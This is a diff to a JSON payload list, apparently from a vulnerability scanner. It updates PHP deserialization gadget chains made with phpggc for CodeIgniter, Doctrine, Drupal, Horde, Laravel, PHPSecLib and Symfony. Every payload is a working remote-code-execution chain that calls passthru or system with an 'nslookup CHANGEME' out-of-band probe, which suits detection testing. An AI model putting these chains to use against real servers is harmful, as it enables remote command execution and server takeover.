@@ -19,21 +19,21 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "CodeIgniter 4.0.0-beta.1 <= ? (1)",
+    "name": "CodeIgniter 4.0.2 (1)",
     "gen_with": "./phpggc CodeIgniter4/RCE1 <function> <parameter>",
     "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:8:\"%00*%00redis\"%3BO:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:12:\"%00*%00memcached\"%3BO:17:\"CodeIgniter\\Model\":5:{s:10:\"%00*%00builder\"%3BO:32:\"CodeIgniter\\Database\\BaseBuilder\":0:{}s:13:\"%00*%00primaryKey\"%3BN%3Bs:15:\"%00*%00beforeDelete\"%3Ba:1:{i:0%3Bs:8:\"validate\"%3B}s:18:\"%00*%00validationRules\"%3Ba:1:{s:2:\"id\"%3Ba:1:{s:5:\"rules\"%3Ba:1:{i:0%3Bs:8:\"passthru\"%3B}}}s:13:\"%00*%00validation\"%3BO:33:\"CodeIgniter\\Validation\\Validation\":1:{s:15:\"%00*%00ruleSetFiles\"%3Ba:1:{i:0%3Bs:5:\"finfo\"%3B}}}s:10:\"%00*%00lockKey\"%3Bs:63:\"nslookup CHANGEME\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "CodeIgniter 4.0.0-rc.4 <= 4.0.3+ (2)",
+    "name": "CodeIgniter 4.0.0-rc.4 <= 4.3.6 (2)",
     "gen_with": "./phpggc CodeIgniter4/RCE2 <function> <parameter>",
     "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:8:\"%00*%00redis\"%3BO:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:12:\"%00*%00memcached\"%3BO:17:\"CodeIgniter\\Model\":8:{s:10:\"%00*%00builder\"%3BO:32:\"CodeIgniter\\Database\\BaseBuilder\":2:{s:6:\"QBFrom\"%3Ba:1:{i:0%3Bs:2:\"()\"%3B}s:2:\"db\"%3BO:38:\"CodeIgniter\\Database\\MySQLi\\Connection\":0:{}}s:13:\"%00*%00primaryKey\"%3BN%3Bs:15:\"%00*%00beforeDelete\"%3Ba:1:{i:0%3Bs:8:\"validate\"%3B}s:18:\"%00*%00validationRules\"%3Ba:1:{s:4:\"id.x\"%3Ba:1:{s:5:\"rules\"%3Ba:2:{i:0%3Bs:6:\"system\"%3Bi:1%3Bs:2:\"dd\"%3B}}}s:13:\"%00*%00validation\"%3BO:33:\"CodeIgniter\\Validation\\Validation\":1:{s:15:\"%00*%00ruleSetFiles\"%3Ba:1:{i:0%3Bs:5:\"finfo\"%3B}}s:21:\"%00*%00tempAllowCallbacks\"%3Bi:1%3Bs:2:\"db\"%3BO:38:\"CodeIgniter\\Database\\MySQLi\\Connection\":0:{}s:20:\"cleanValidationRules\"%3Bb:0%3B}s:10:\"%00*%00lockKey\"%3Ba:1:{s:1:\"x\"%3Bs:63:\"nslookup CHANGEME\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "CodeIgniter -4.1.3+ (3)",
+    "name": "CodeIgniter 4.0.4 <= 4.4.3 (3)",
     "gen_with": "./phpggc CodeIgniter4/RCE3 <function> <parameter>",
-    "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:5:\"redis\"%3BO:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:7:\"lockKey\"%3Bs:9:\"Firebasky\"%3Bs:9:\"memcached\"%3BO:20:\"Faker\\ValidGenerator\":3:{s:12:\"%00*%00generator\"%3BO:22:\"Faker\\DefaultGenerator\":1:{s:10:\"%00*%00default\"%3Bs:63:\"nslookup CHANGEME\"%3B}s:12:\"%00*%00validator\"%3Bs:6:\"system\"%3Bs:13:\"%00*%00maxRetries\"%3Bi:1%3B}}}"
+    "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:8:\"%00*%00redis\"%3BO:20:\"Faker\\ValidGenerator\":3:{s:12:\"%00*%00generator\"%3BO:22:\"Faker\\DefaultGenerator\":1:{s:10:\"%00*%00default\"%3Bs:63:\"nslookup+CHANGEME\"%3B}s:12:\"%00*%00validator\"%3Bs:8:\"passthru\"%3Bs:13:\"%00*%00maxRetries\"%3Bi:1%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -43,7 +43,7 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "CodeIgniter ? (5)",
+    "name": "CodeIgniter -4.1.3+ (5)",
     "gen_with": "./phpggc CodeIgniter4/RCE5 <function> <parameter>",
     "payload": "O:34:\"Predis\\Connection\\StreamConnection\":1:{s:13:\"%00*%00parameters\"%3BO:25:\"CodeIgniter\\Entity\\Entity\":1:{s:10:\"%00*%00datamap\"%3Ba:1:{s:10:\"persistent\"%3BO:40:\"Symfony\\Component\\HttpFoundation\\Request\":2:{s:6:\"server\"%3BO:61:\"Symfony\\Component\\DependencyInjection\\Argument\\ServiceLocator\":2:{s:73:\"%00Symfony\\Component\\DependencyInjection\\Argument\\ServiceLocator%00serviceMap\"%3Ba:1:{s:14:\"REQUEST_METHOD\"%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:70:\"%00Symfony\\Component\\DependencyInjection\\Argument\\ServiceLocator%00factory\"%3Bs:14:\"call_user_func\"%3B}s:7:\"cookies\"%3Ba:1:{s:3:\"key\"%3Bs:5:\"value\"%3B}}}}}"
   },
@@ -57,7 +57,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Doctrine/RCE1 1.5.1 <= 2.7.2",
     "gen_with": "./phpggc Doctrine/RCE1 <code>",
-    "payload": "a:4:{i:1000%3BO:39:\"Doctrine\\Common\\Cache\\Psr6\\CacheAdapter\":3:{s:13:\"deferredItems\"%3Ba:1:{i:0%3BO:41:\"Doctrine\\Common\\Cache\\Psr6\\TypedCacheItem\":2:{s:6:\"expiry\"%3Bi:99999999999999999%3Bs:5:\"value\"%3Bs:4:\"test\"%3B}}s:6:\"loader\"%3Bi:1%3Bs:5:\"cache\"%3BO:71:\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\MockFileSessionStorage\":5:{s:7:\"started\"%3Bb:1%3Bs:8:\"savePath\"%3Bs:4:\"/tmp\"%3Bs:2:\"id\"%3Bs:3:\"aaa\"%3Bs:4:\"data\"%3Ba:1:{i:0%3Bs:85:\"<?php passthru('nslookup CHANGEME')%3B ?>\"%3B}s:11:\"metadataBag\"%3BO:60:\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\MetadataBag\":1:{s:10:\"storageKey\"%3Bs:1:\"a\"%3B}}}i:1000%3Bi:1%3Bi:2000%3BO:39:\"Doctrine\\Common\\Cache\\Psr6\\CacheAdapter\":3:{s:13:\"deferredItems\"%3Ba:1:{i:0%3BO:41:\"Doctrine\\Common\\Cache\\Psr6\\TypedCacheItem\":2:{s:6:\"expiry\"%3Bi:0%3Bs:5:\"value\"%3Bs:4:\"test\"%3B}}s:6:\"loader\"%3Bi:1%3Bs:5:\"cache\"%3BO:47:\"Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter\":1:{s:4:\"file\"%3Bs:17:\"/tmp/aaa.mocksess\"%3B}}i:2000%3Bi:1%3B}"
+    "payload": "a:4:{i:1000%3BO:39:\"Doctrine\\Common\\Cache\\Psr6\\CacheAdapter\":3:{s:13:\"deferredItems\"%3Ba:1:{i:0%3BO:41:\"Doctrine\\Common\\Cache\\Psr6\\TypedCacheItem\":2:{s:6:\"expiry\"%3Bi:99999999999999999%3Bs:5:\"value\"%3Bs:4:\"test\"%3B}}s:6:\"loader\"%3Bi:1%3Bs:5:\"cache\"%3BO:71:\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\MockFileSessionStorage\":5:{s:7:\"started\"%3Bb:1%3Bs:8:\"savePath\"%3Bs:4:\"/tmp\"%3Bs:2:\"id\"%3Bs:3:\"aaa\"%3Bs:4:\"data\"%3Ba:1:{i:0%3Bs:85:\"<?php+passthru('nslookup+CHANGEME')%3B+?>\"%3B}s:11:\"metadataBag\"%3BO:60:\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\MetadataBag\":1:{s:10:\"storageKey\"%3Bs:1:\"a\"%3B}}}i:1000%3Bi:1%3Bi:2000%3BO:39:\"Doctrine\\Common\\Cache\\Psr6\\CacheAdapter\":3:{s:13:\"deferredItems\"%3Ba:1:{i:0%3BO:41:\"Doctrine\\Common\\Cache\\Psr6\\TypedCacheItem\":2:{s:6:\"expiry\"%3Bi:0%3Bs:5:\"value\"%3Bs:4:\"test\"%3B}}s:6:\"loader\"%3Bi:1%3Bs:5:\"cache\"%3BO:47:\"Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter\":1:{s:4:\"file\"%3Bs:17:\"/tmp/aaa.mocksess\"%3B}}i:2000%3Bi:1%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -69,11 +69,11 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Drupal 7.0.8 < ?",
     "gen_with": "./phpggc Drupal7/RCE1 <function> <parameter>",
-    "payload": "O:11:\"SchemaCache\":4:{s:6:\"%00*%00cid\"%3Bs:14:\"form_DrupalRCE\"%3Bs:6:\"%00*%00bin\"%3Bs:10:\"cache_form\"%3Bs:16:\"%00*%00keysToPersist\"%3Ba:3:{s:8:\"#form_id\"%3Bb:1%3Bs:8:\"#process\"%3Bb:1%3Bs:9:\"#attached\"%3Bb:1%3B}s:10:\"%00*%00storage\"%3Ba:3:{s:8:\"#form_id\"%3Bs:9:\"DrupalRCE\"%3Bs:8:\"#process\"%3Ba:1:{i:0%3Bs:23:\"drupal_process_attached\"%3B}s:9:\"#attached\"%3Ba:1:{s:6:\"system\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}}}}"
+    "payload": "O:11:\"SchemaCache\":4:{s:6:\"%00*%00cid\"%3Bs:14:\"form_DrupalRCE\"%3Bs:6:\"%00*%00bin\"%3Bs:10:\"cache_form\"%3Bs:16:\"%00*%00keysToPersist\"%3Ba:3:{s:8:\"#form_id\"%3Bb:1%3Bs:8:\"#process\"%3Bb:1%3Bs:9:\"#attached\"%3Bb:1%3B}s:10:\"%00*%00storage\"%3Ba:3:{s:8:\"#form_id\"%3Bs:9:\"DrupalRCE\"%3Bs:8:\"#process\"%3Ba:1:{i:0%3Bs:23:\"drupal_process_attached\"%3B}s:9:\"#attached\"%3Ba:1:{s:8:\"passthru\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:63:\"nslookup+CHANGEME\"%3B}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Drupal -8.9.6 <= 9.4.9+",
+    "name": "Drupal -8.9.6 <= 9.5.10+",
     "gen_with": "./phpggc Drupal9/RCE1 <function> <parameter>",
     "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"%00GuzzleHttp\\Cookie\\FileCookieJar%00filename\"%3BO:32:\"Laminas\\Diactoros\\RelativeStream\":1:{s:49:\"%00Laminas\\Diactoros\\RelativeStream%00decoratedStream\"%3BO:26:\"GuzzleHttp\\Psr7\\PumpStream\":2:{s:34:\"%00GuzzleHttp\\Psr7\\PumpStream%00source\"%3Bs:1:\"1\"%3Bs:34:\"%00GuzzleHttp\\Psr7\\PumpStream%00buffer\"%3BO:32:\"Drupal\\Core\\Config\\CachedStorage\":2:{s:10:\"%00*%00storage\"%3BO:32:\"Drupal\\Core\\Config\\MemoryStorage\":1:{s:13:\"%00*%00collection\"%3Bs:0:\"\"%3B}s:8:\"%00*%00cache\"%3BO:46:\"Drupal\\Component\\DependencyInjection\\Container\":1:{s:21:\"%00*%00serviceDefinitions\"%3Ba:1:{i:1000000%3Bs:132:\"a:2:{s:7:\"factory\"%3Bs:8:\"passthru\"%3Bs:9:\"arguments\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}\"%3B}}}}}}"
   },
@@ -87,7 +87,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Horde <= 5.2.22 (1)",
     "gen_with": "./phpggc Horde/RCE1 <php-code>",
-    "payload": "O:34:\"Horde_Kolab_Server_Decorator_Clean\":2:{s:43:\"%00Horde_Kolab_Server_Decorator_Clean%00_server\"%3BO:20:\"Horde_Prefs_Identity\":3:{s:9:\"%00*%00_prefs\"%3BO:11:\"Horde_Prefs\":2:{s:8:\"%00*%00_opts\"%3Ba:1:{s:12:\"sizecallback\"%3Ba:2:{i:0%3BO:12:\"Horde_Config\":1:{s:13:\"%00*%00_oldConfig\"%3Bs:81:\"passthru('nslookup CHANGEME')%3B%3Bdie%3B\"%3B}i:1%3Bs:13:\"readXMLConfig\"%3B}}s:10:\"%00*%00_scopes\"%3Ba:1:{s:5:\"horde\"%3BC:17:\"Horde_Prefs_Scope\":10:{[null,[1]]}}}s:13:\"%00*%00_prefnames\"%3Ba:1:{s:10:\"identities\"%3Bi:0%3B}s:14:\"%00*%00_identities\"%3Ba:1:{i:0%3Bi:0%3B}}s:42:\"%00Horde_Kolab_Server_Decorator_Clean%00_added\"%3Ba:1:{i:0%3Bi:0%3B}}"
+    "payload": "O:34:\"Horde_Kolab_Server_Decorator_Clean\":2:{s:43:\"%00Horde_Kolab_Server_Decorator_Clean%00_server\"%3BO:20:\"Horde_Prefs_Identity\":3:{s:9:\"%00*%00_prefs\"%3BO:11:\"Horde_Prefs\":2:{s:8:\"%00*%00_opts\"%3Ba:1:{s:12:\"sizecallback\"%3Ba:2:{i:0%3BO:12:\"Horde_Config\":1:{s:13:\"%00*%00_oldConfig\"%3Bs:81:\"passthru('nslookup+CHANGEME')%3B%3Bdie%3B\"%3B}i:1%3Bs:13:\"readXMLConfig\"%3B}}s:10:\"%00*%00_scopes\"%3Ba:1:{s:5:\"horde\"%3BC:17:\"Horde_Prefs_Scope\":10:{[null,[1]]}}}s:13:\"%00*%00_prefnames\"%3Ba:1:{s:10:\"identities\"%3Bi:0%3B}s:14:\"%00*%00_identities\"%3Ba:1:{i:0%3Bi:0%3B}}s:42:\"%00Horde_Kolab_Server_Decorator_Clean%00_added\"%3Ba:1:{i:0%3Bi:0%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -117,7 +117,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.8.30 (5)",
     "gen_with": "./phpggc Laravel/RCE5 <php-code>",
-    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:91:\"<?php passthru('nslookup CHANGEME')%3B exit%3B ?>\"%3B}}}"
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:91:\"<?php+passthru('nslookup+CHANGEME')%3B+exit%3B+?>\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -163,27 +163,51 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel ??? (13)",
+    "name": "Laravel 5.3.0 <= 9.5.1+ (13)",
     "gen_with": "./phpggc Laravel/RCE13 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"%00*%00events\"%3BO:35:\"Illuminate\\Database\\DatabaseManager\":2:{s:6:\"%00*%00app\"%3Ba:1:{s:6:\"config\"%3Ba:2:{s:16:\"database.default\"%3Bs:8:\"passthru\"%3Bs:20:\"database.connections\"%3Ba:1:{s:8:\"passthru\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}}}s:13:\"%00*%00extensions\"%3Ba:1:{s:8:\"passthru\"%3Bs:12:\"array_filter\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel ??? (14)",
+    "name": "Laravel 5.3.0 <= 9.5.1+ (14)",
     "gen_with": "./phpggc Laravel/RCE14 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"%00*%00events\"%3BO:20:\"Faker\\ValidGenerator\":3:{s:12:\"%00*%00generator\"%3BO:22:\"Faker\\DefaultGenerator\":1:{s:10:\"%00*%00default\"%3Bs:63:\"nslookup CHANGEME\"%3B}s:13:\"%00*%00maxRetries\"%3Bi:1%3Bs:12:\"%00*%00validator\"%3Bs:8:\"passthru\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel ??? (15)",
+    "name": "Laravel 5.5.0 <= v9.5.1+ (15)",
     "gen_with": "./phpggc Laravel/RCE15 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"%00*%00events\"%3BO:29:\"Illuminate\\Queue\\QueueManager\":2:{s:6:\"%00*%00app\"%3Ba:1:{s:6:\"config\"%3Ba:2:{s:13:\"queue.default\"%3Bs:3:\"key\"%3Bs:21:\"queue.connections.key\"%3Ba:1:{s:6:\"driver\"%3Bs:4:\"func\"%3B}}}s:13:\"%00*%00connectors\"%3Ba:1:{s:4:\"func\"%3Ba:2:{i:0%3BO:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:11:\"%00*%00callback\"%3Bs:14:\"call_user_func\"%3Bs:10:\"%00*%00request\"%3Bs:8:\"passthru\"%3Bs:11:\"%00*%00provider\"%3Bs:63:\"nslookup CHANGEME\"%3B}i:1%3Bs:4:\"user\"%3B}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel ??? (16)",
+    "name": "Laravel 5.6.0 <= v9.5.1+ (16)",
+    "gen_with": "./phpggc Laravel/RCE16 <function> <parameter>",
+    "payload": "O:35:\"Monolog\\Handler\\RotatingFileHandler\":4:{s:13:\"%00*%00mustRotate\"%3Bb:1%3Bs:11:\"%00*%00filename\"%3Bs:8:\"anything\"%3Bs:17:\"%00*%00filenameFormat\"%3BO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\"%3Ba:2:{i:0%3BO:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:11:\"%00*%00callback\"%3Bs:14:\"call_user_func\"%3Bs:10:\"%00*%00request\"%3Bs:8:\"passthru\"%3Bs:11:\"%00*%00provider\"%3Bs:63:\"nslookup+CHANGEME\"%3B}i:1%3Bs:4:\"user\"%3B}}s:13:\"%00*%00dateFormat\"%3Bs:1:\"l\"%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Laravel 10.31.0 (17)",
     "gen_with": "./phpggc Laravel/RCE17 <function> <parameter>",
-    "payload": "O:35:\"Monolog\\Handler\\RotatingFileHandler\":4:{s:13:\"%00*%00mustRotate\"%3Bb:1%3Bs:11:\"%00*%00filename\"%3Bs:8:\"anything\"%3Bs:17:\"%00*%00filenameFormat\"%3BO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\"%3Ba:2:{i:0%3BO:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:11:\"%00*%00callback\"%3Bs:14:\"call_user_func\"%3Bs:10:\"%00*%00request\"%3Bs:8:\"passthru\"%3Bs:11:\"%00*%00provider\"%3Bs:63:\"nslookup CHANGEME\"%3B}i:1%3Bs:4:\"user\"%3B}}s:13:\"%00*%00dateFormat\"%3Bs:1:\"l\"%3B}"
+    "payload": "O:55:\"Illuminate\\Routing\\PendingSingletonResourceRegistration\":4:{s:12:\"%00*%00registrar\"%3BO:35:\"Illuminate\\Database\\DatabaseManager\":3:{s:6:\"%00*%00app\"%3Ba:1:{s:6:\"config\"%3Ba:2:{s:16:\"database.default\"%3Bs:8:\"passthru\"%3Bs:20:\"database.connections\"%3Ba:1:{s:8:\"passthru\"%3Bs:64:\"anslookup+CHANGEME\"%3B}}}s:10:\"%00*%00factory\"%3Bs:8:\"anything\"%3Bs:13:\"%00*%00extensions\"%3Ba:1:{s:8:\"passthru\"%3Bs:12:\"array_filter\"%3B}}s:7:\"%00*%00name\"%3Bs:4:\"name\"%3Bs:13:\"%00*%00controller\"%3Bs:10:\"controller\"%3Bs:10:\"%00*%00options\"%3Ba:0:{}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Laravel 10.31.0 (18)",
+    "gen_with": "./phpggc Laravel/RCE18 <code>",
+    "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"%00GuzzleHttp\\Cookie\\FileCookieJar%00filename\"%3BO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\"%3Ba:2:{i:0%3BO:48:\"PHPUnit\\Framework\\MockObject\\Generator\\MockTrait\":2:{s:59:\"%00PHPUnit\\Framework\\MockObject\\Generator\\MockTrait%00classCode\"%3Bs:81:\"passthru('nslookup+CHANGEME')%3Bexit%3B\"%3Bs:58:\"%00PHPUnit\\Framework\\MockObject\\Generator\\MockTrait%00mockName\"%3Bs:3:\"asd\"%3B}i:1%3Bs:8:\"generate\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Laravel 10.34 (19)",
+    "gen_with": "./phpggc Laravel/RCE19 <command>",
+    "payload": "O:24:\"Illuminate\\Support\\Sleep\":2:{s:11:\"shouldSleep\"%3Bb:1%3Bs:8:\"duration\"%3BO:42:\"Illuminate\\View\\InvokableComponentVariable\":1:{s:8:\"callable\"%3Ba:2:{i:0%3BO:24:\"Laravel\\Prompts\\Terminal\":1:{s:14:\"initialTtyMode\"%3Bs:77:\"%3Bnslookup+CHANGEME?1703109698%3B#\"%3B}i:1%3Bs:10:\"restoreTty\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Laravel 5.6 <= 10.x (20)",
+    "gen_with": "./phpggc Laravel/RCE20 <function> <parameter>",
+    "payload": "O:46:\"Illuminate\\Routing\\PendingResourceRegistration\":3:{s:12:\"%00*%00registrar\"%3BO:36:\"Illuminate\\Routing\\ResourceRegistrar\":1:{s:9:\"%00*%00router\"%3BN%3B}s:7:\"%00*%00name\"%3BO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\"%3Ba:2:{i:0%3BO:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:11:\"%00*%00callback\"%3Bs:8:\"passthru\"%3Bs:10:\"%00*%00request\"%3Bs:63:\"nslookup+CHANGEME\"%3Bs:11:\"%00*%00provider\"%3Bi:1%3B}i:1%3Bs:4:\"user\"%3B}}s:13:\"%00*%00registered\"%3Bb:0%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -249,7 +273,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "PHPSecLib 2.0.0 <= 2.0.34 (1)",
     "gen_with": "./phpggc PHPSecLib/RCE1 <php-code>",
-    "payload": "a:1:{i:0%3BO:18:\"phpseclib\\Net\\SSH1\":2:{s:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3BO:19:\"phpseclib\\Crypt\\AES\":8:{s:10:\"block_size\"%3BN%3Bs:12:\"inline_crypt\"%3Ba:2:{i:0%3BO:25:\"phpseclib\\Crypt\\TripleDES\":6:{s:10:\"block_size\"%3Bs:104:\"1){}}}%3B ob_clean()%3Bpassthru('nslookup CHANGEME')%3Bdie()%3B ?>\"%3Bs:12:\"inline_crypt\"%3BN%3Bs:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3B}i:1%3Bs:26:\"_createInlineCryptFunction\"%3B}s:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3Bs:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3Bi:1%3B}}}"
+    "payload": "a:1:{i:0%3BO:18:\"phpseclib\\Net\\SSH1\":2:{s:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3BO:19:\"phpseclib\\Crypt\\AES\":8:{s:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3Bi:1%3Bs:10:\"block_size\"%3BN%3Bs:12:\"inline_crypt\"%3Ba:2:{i:0%3BO:25:\"phpseclib\\Crypt\\TripleDES\":6:{s:10:\"block_size\"%3Bs:104:\"1){}}}%3B+ob_clean()%3Bpassthru('nslookup+CHANGEME')%3Bdie()%3B+?>\"%3Bs:12:\"inline_crypt\"%3BN%3Bs:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3B}i:1%3Bs:26:\"_createInlineCryptFunction\"%3B}s:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -292,7 +316,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 2.6 <= 2.8.32 (3)",
     "gen_with": "./phpggc Symfony/RCE3 \"passthru('nslookup CHANGEME')\"",
-    "payload": "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:51:\"%00Symfony\\Component\\Process\\Pipes\\WindowsPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:92:\"<?php passthru('nslookup CHANGEME')%3B%3Bdie()%3B ?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
+    "payload": "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:51:\"%00Symfony\\Component\\Process\\Pipes\\WindowsPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:92:\"<?php+passthru('nslookup+CHANGEME')%3B%3Bdie()%3B+?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -340,7 +364,8 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 2.0.4 <= 5.4.24 (all) (11)",
     "gen_with": "./phpggc Symfony/RCE11 <function> <parameter>",
-    "payload": "C:67:\"Symfony\\Component\\Security\\Core\\Authentication\\Token\\AnonymousToken\":569:{a:2:{i:0%3BN%3Bi:1%3BO:37:\"Symfony\\Component\\BrowserKit\\Response\":1:{s:46:\"%00Symfony\\Component\\BrowserKit\\Response%00headers\"%3BO:50:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{s:60:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00iterator\"%3BO:51:\"Symfony\\Component\\Validator\\ConstraintViolationList\":1:{s:63:\"%00Symfony\\Component\\Validator\\ConstraintViolationList%00violations\"%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:56:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00sort\"%3Bs:14:\"call_user_func\"%3B}}}}""  },
